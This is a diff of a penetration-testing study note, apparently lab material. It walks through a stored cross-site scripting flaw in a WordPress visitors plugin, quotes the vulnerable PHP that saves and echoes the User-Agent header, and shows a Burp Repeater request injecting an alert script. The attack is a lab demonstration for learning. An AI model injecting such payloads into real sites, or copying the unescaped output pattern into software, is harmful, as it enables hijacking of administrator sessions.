@@ -110,139 +110,64 @@ we are greeted with a pop-up banner showing the number 42, proving that our code
 
 Excellent. We have injected an XSS payload into the web application's database and it will be served to any administrator that loads the plugin. A simple alert window is a somewhat trivial example of what can be done with XSS, so let’s try something more interesting, like creating a new administrative account.
 
-> [!note]- Screenshot
-> ```
-> The source code for the plugin can be downloaded from its website. If we inspect the
-> database.php file, we can verify how the data is stored inside the WordPress database:
+> [!example] How the record is stored (database.php)
+> The plugin saves the raw `User-Agent` header straight into the database with no sanitization:
+> ```php
 > function VST_save_record() {
-> global $wpdb;
-> $table_name = $wpdb->prefix . “VST_registros";
-> VsT_create_table_records();
-> return $updb->insert(
-> $table_name,
-> array(
-> “patch” => $_SERVER["REQUEST_URI™],,
-> ‘datetime’ => current_time( ‘mysql’ ),
-> ‘useragent" => $ SERVER["HTTP_USER_AGENT’],
-> ‘ip’ => $_SERVER[ 'HTTP_X_FORWARDED_FOR*]
-> )
-> 3
-> 3
-> Listing 24 - Inspecting Visitor Plugin Record Creation Function
+>     global $wpdb;
+>     $table_name = $wpdb->prefix . "VST_registros";
+>     VST_create_table_records();
+>     return $wpdb->insert(
+>         $table_name,
+>         array(
+>             'patch'     => $_SERVER["REQUEST_URI"],
+>             'datetime'  => current_time('mysql'),
+>             'useragent' => $_SERVER["HTTP_USER_AGENT"],
+>             'ip'        => $_SERVER['HTTP_X_FORWARDED_FOR']
+>         )
+>     );
+> }
 > ```
 
 
-> [!note]- Screenshot
-> ```
-> Next, each time a WordPress administrator loads the Visitor plugin, the function will
-> execute the following portion of code from start.php:
-> $i=count(VST_get_records($date_start, $date_finish));
-> foreach(VST_get_records($date_start, $date finish) as $record) {
-> echo *
-> <tr class="active” >
-> <td scope="row” >".$i."</td>
-> <td scope="row" >" .date format (date_create($record->datetime),
-> get_option(“links_updated_date_format”)).°</td>
-> <td scope="row” >". $record->patch. "</td>
-> <td scope="row” ><a href="https: //www.geolocation.com/es?ip=" .$record-
-> >ip. #ipresult">’ .$record->ip."</a></td>
-> <td>" $record-suseragent. "</td>
-> </tr>"
-> $i--s
-> 3
-> Listing 25 - Inspecting Visitors Plugin Record Visualization Function
+> [!example] How the record is rendered (start.php)
+> When an admin loads the plugin, each stored value is echoed straight into a table cell — the `useragent` field is placed inside `<td>` tags with no encoding, so any script it contains executes:
+> ```php
+> $i = count(VST_get_records($date_start, $date_finish));
+> foreach (VST_get_records($date_start, $date_finish) as $record) {
+>     echo "
+>     <tr class='active'>
+>         <td scope='row'>".$i."</td>
+>         <td scope='row'>".date_format(date_create($record->datetime), get_option('links_updated_date_format'))."</td>
+>         <td scope='row'>".$record->patch."</td>
+>         <td scope='row'><a href='https://www.geolocation.com/es?ip=".$record->ip."#ipresult'>".$record->ip."</a></td>
+>         <td>".$record->useragent."</td>
+>     </tr>";
+>     $i--;
+> }
 > ```
 
 
-> [!note]- Screenshot
-> ```
-> © Info
-> 
-> Although we just performed a white-box testing approach, we could have
-> discovered the same vulnerability by testing the plugin through black-box HTTP.
-> header fuzzing.
-> ```
+> [!info]
+> Although this was a white-box approach (reading the plugin source), the same vulnerability could have been found black-box by fuzzing HTTP headers such as `User-Agent`.
 
 
-> [!note]- Screenshot
-> ```
-> Burp Project Intruder Repeater. Window Help
-> Dashboard Target Proxy Intruder _—=«—=Repeater_—«Sequencer_-—«‘Decoder. «© Comparer Logger Extender
-> Intercept __HTTPhistory __WebSocketshistory Options
-> Filter: Hiding CSS, image and general binary content
-> * Host Method URL Params Edited Status. Length MIM
-> ji httpiloffsecwp cr ann 47436
-> hitp/offsecwp!
-> ‘Add to scope
-> Send tointruder ‘
-> ‘Sendto Repeater ctrleR
-> Send to Sequencer
-> Send to Comparer (request)
-> Send to Comparer response)
-> ‘Show response in browser
-> Request inbrowser
-> Request Engagement tools [Pro version ony]
-> Ea @r = Show new history window
-> L GET / HITP/1.1 ‘Addcomment
-> Host: offsecwp Highlight
-> User-Agent: Mozilla/5.0 (X11; Linux x86 64; rv:91.0) Ge
-> 4 Accept: text/html, application/xhtml+xml,application/xml,  Deleteitem
-> 5 Accept -Language: en-US,en;q=0.5 Clear history
-> 6 Accept-Encoding: gzip, deflate
-> Connection: close Copy URL
-> Cookie: wordpress test_cookie=WP+20Cookies20check: Copy curl command
-> wordpress logged_in_ff4)52f¥2b49b52aa95183b2e5ad08ce= Py as cu
-> admin’: 7C1649848757.7C22hpoMYRvjKNS2XqicHO4MLELuaWqQVKGH —Copylinks )7a67b57be088
-> cc 400b1447daS#541 420280e66392b6; wp-settings-1=library, ime-1=
-> 1649675957 Saveltem
-> 9 Upgrade-Insecure-Requests: 1 Proxy history documentation
-> ho
-> ba
-> Figure 26: Forwarding the request to the Repeater
-> ```
+> [!info] Send the request to Repeater
+> In Burp Proxy → HTTP history, right-click the `GET /` request to `offsecwp` and choose **Send to Repeater** (Ctrl+R) so you can edit and resend it.
 
 
-> [!note]- Screenshot
+> [!example] Inject the payload in Repeater
+> In the Repeater tab, replace the `User-Agent` header value with the alert payload and send:
+> ```http
+> GET / HTTP/1.1
+> Host: offsecwp
+> User-Agent: <script>alert(42)</script>
 > ```
-> Moving to the Repeater tab, we can replace the default User-Agent value with the a
-> script tag that includes the alert method (<script>alert(42)</script>), then send the
-> request.
-> Burp Project Intruder Repeater Window Help
-> Dashboard ‘Target ‘Proxy intruder _—=Repeater «Sequencer _—«‘Decoder_—«Comparer Logger ‘Extender
-> 1s
-> Es Gu =
-> 1 Ger / HITP/L.A
-> 2 Host: offsecup
-> 5 User-Agent: <script>alert (42) </script>
-> 4 Accept: text/htal, applacation/xhtal+xml , application/xal :q=0.9, image/webp,*/*:q-0.8
-> 5 Accept-Language: en-US,en:q=0.5,
-> Accept-Encoding: gzip, deflate
-> Connection: close
-> Cookie: vordpress_test_cookies
-> wordpress Logged_in_f#4b52f¥2b49052aa991 83 2eSado8ce
-> } wp-settings-1= } Wp-settings-tine-1=
-> Upgrade-Insecure-Requests: 1
-> u
-> a
-> Figure 27: Forwarding the request to the Repeater
-> ```
+> A `200 OK` response means the payload is now stored in the WordPress database.
 
 
-> [!note]- Screenshot
-> ```
-> D) ote O7 Mo tne
-> @ Dashboard l
-> P Post
-> 9) Mess Visitors
-> Pa stat
-> comme Todey pri 2022 .
-> F Aopenrance ers
-> sen ® Dateand Time ‘URL °
-> # ea 1 sori, 2022703 9m 1
-> Seti Sottsccnp
-> °
-> Figure 28: Demonstrating the XSS vulnerability
-> ```
+> [!success] Vulnerability demonstrated
+> Logging in as admin and opening the Visitors plugin dashboard (`/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php`) triggers a pop-up showing **42** — the stored script executed in the admin's browser, confirming stored XSS.
 
 ---
 %% graph-links %%
